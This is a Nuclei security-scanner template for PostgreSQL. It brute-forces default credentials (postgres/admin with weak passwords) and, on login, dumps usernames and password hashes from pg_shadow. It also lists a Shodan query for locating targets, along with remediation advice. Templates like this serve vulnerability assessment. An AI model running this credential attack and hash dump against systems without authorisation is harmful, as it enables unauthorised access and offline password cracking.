id: pgsql-list-password-hashes

info:
  name: PostgreSQL 密码哈希枚举（服务漏洞）
  author: pussycat0x
  severity: high
  description: |
    PostgreSQL 服务接受模板尝试的凭据后，可能允许读取 pg_authid/pg_shadow 等位置中的密码哈希。模板登录后执行哈希枚举查询，并输出账号与哈希字段，用于确认凭据材料泄露风险。
  impact: |
    - PostgreSQL 密码哈希泄露可被用于离线破解，进而获得可复用数据库凭据。
    - 若账号复用或权限较高，破解结果可能导致更多数据库、应用或主机被访问。
  remediation: |
    - 禁止普通账号访问 pg_authid/pg_shadow 等敏感凭据表，撤销高权限角色滥用。
    - 轮换已暴露账号口令，启用强密码策略，并审计异常哈希读取行为。
  reference:
    - https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md#postgresql-list-password-hashes
    - https://launchbylunch.com/posts/2024/Jan/16/postgres-password-encryption/#postgresql-password-encryption-scram-sha-256
    - https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/auxiliary/scanner/postgres/postgres_hashdump.md
  metadata:
    verified: true
    max-request: 8
    shodan-query: "product:\"PostgreSQL\""
    vendor: postgresql
    product: postgresql
  tags: js,network,postgresql,authenticated,enum,discovery
javascript:
  - pre-condition: |
      isPortOpen(Host,Port);
    code: |
      const postgres = require('nuclei/postgres');
      const client = new postgres.PGClient;
      connected =  client.ExecuteQuery(Host, Port, User, Pass, Db, "SELECT usename, passwd FROM pg_shadow");
      Export(connected)

    args:
      Host: "{{Host}}"
      Port: 5432
      User: "{{usernames}}"
      Pass: "{{password}}"
      Db: "{{database}}"

    payloads:
      usernames:
        - postgres
        - admin
      password:
        - postgres
        -
        - 123
        - amber
      database:
        - postgres

    attack: clusterbomb

    extractors:
      - type: json
        json:
          - '.Rows[] | "\(.usename) : \(.passwd)"'
